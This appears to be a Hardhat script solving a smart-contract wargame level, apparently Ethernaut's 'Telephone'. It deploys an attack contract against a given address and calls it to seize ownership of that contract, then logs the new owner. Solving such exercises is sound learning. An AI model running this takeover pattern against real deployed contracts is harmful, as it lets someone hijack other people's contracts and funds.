const hre = require("hardhat");

async function main() {
    const INSTANCE_ADDRESS = "0x39047747E8Bc9249ac2Bb84191E14caC0CAC0b06";
    const [deployer] = await ethers.getSigners();

    // Deploy attack contract
    const TelephoneAttack = await ethers.getContractFactory("TelephoneAttack");
    const telephoneAttack = await TelephoneAttack.deploy(INSTANCE_ADDRESS);
    await telephoneAttack.deployed();

    console.log(`TelephoneAttack contract deployed to ${telephoneAttack.address}`);

    // Execute attack...
    const transaction = await telephoneAttack.connect(deployer).attackChangeOwner(deployer.address);
    await transaction.wait();

    console.log(`Attack complete...\n`);

    // Create Telephone contract instance...
    const telephone = await hre.ethers.getContractAt("Telephone", INSTANCE_ADDRESS);

    const owner = await telephone.owner();
    console.log(`Current owner: ${owner}\n`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});